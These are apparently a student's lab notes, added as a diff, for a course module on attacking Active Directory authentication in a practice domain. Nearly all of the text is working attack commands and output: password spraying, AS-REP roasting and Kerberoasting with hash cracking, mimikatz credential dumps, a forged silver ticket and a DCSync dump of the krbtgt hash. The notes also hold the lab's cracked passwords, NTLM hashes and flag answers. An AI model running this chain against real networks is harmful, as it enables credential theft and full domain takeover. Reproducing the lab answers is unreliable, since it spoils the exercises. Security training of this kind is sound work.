@@ -1,0 +1,126 @@
+Attacking Active Directory Authentication
+
+Understanding Active Directory Authentication
+
+NTLM Authentication
+
+NTLM
+MD4
+
+Kerberos Authentication
+
+AS-REQ
+Kerberos
+TGS-REQ
+
+Cached AD Credentials
+
+sekurlsa::logonpasswords
+
+--------------
+Performing Attacks on Active Directory Authentication
+
+Password Attacks
+
+Spray-Passwords.ps1 
+crackmapexec
+kerbrute
+
+attacker 192.168.49.57
+client75 192.168.57.75
+jeff:HenchmanPutridBonbon11
+
+xfreerdp /v:192.168.57.75 /u:jeff /p:HenchmanPutridBonbon11
+
+crackmapexec smb 192.168.57.70 -u pete -p 'Nexus123!' -d corp.com
+crackmapexec smb 192.168.57.72 -u pete -p 'Nexus123!' -d corp.com
+crackmapexec smb 192.168.57.73 -u pete -p 'Nexus123!' -d corp.com
+crackmapexec smb 192.168.57.74 -u pete -p 'Nexus123!' -d corp.com
+crackmapexec smb 192.168.57.75 -u pete -p 'Nexus123!' -d corp.com
+crackmapexec smb 192.168.57.76 -u pete -p 'Nexus123!' -d corp.com
+CLIENT76 (Pwn3d!)
+
+-----
+AS-REP Roasting
+
+impacket-GetNPUsers
+Rubeus
+
+18200
+
+impacket-GetNPUsers -dc-ip 192.168.57.70  -request -outputfile hashes.asreproast corp.com/pete
+pete:Nexus123!
+dave
+jen
+sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+jen:Summerland1
+
+------
+Kerberoasting
+
+13100
+
+dc1 192.168.57.70
+
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.57.70 corp.com/jeff -outputfile hashes.kerberoast
+jeff:HenchmanPutridBonbon11
+echo '$1' > rule1.rule
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r rule1.rule --force
+MattLovesAutumn1
+
+-----
+Silver Tickets
+
+forge a silver ticket for jeffadmin in order to access the web page located at http://web04, Login to the CLIENT75 (192.168.x.75) machine using jeff user with xfreerdp, To quickly find the flag, utilize "| findstr /i OS{"
+
+client75 192.168.57.75
+web04 192.168.57.72
+dc1 192.168.57.70
+
+xfreerdp /v:192.168.57.75 /u:jeff /p:HenchmanPutridBonbon11
+
+c:\tools\mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+Username : iis_service
+NTLM     : 4d28cf5252d39971419580a51484ca09
+
+whoami /user
+corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
+
+kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+exit
+
+klist
+Client: jeffadmin @ corp.com
+
+iwr -UseDefaultCredentials http://web04 | Select-String -Pattern "OS"
+OS{3538256476b35ed61b0701a81d5076f2}
+
+------
+Domain Controller Synchronization
+
+perform the dcsync attack to obtain the NTLM hash of the krbtgt account (corp\krbtgt). Enter the NTLM hash
+
+client75 192.168.57.75
+dc01 192.168.57.70
+jeffadmin:BrouhahaTungPerorateBroom2023!
+
+xfreerdp /v:192.168.57.75 /u:jeffadmin /p:BrouhahaTungPerorateBroom2023!
+
+C:\Tools\mimikatz.exe
+lsadump::dcsync /user:corp\krbtgt
+Hash NTLM: 1693c6cefafffc7af11ef34d1c788f47
+
+Linux method:
+impacket-secretsdump -just-dc-user krbtgt corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.57.70
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
+
+
+
+
+
+
+
+
+
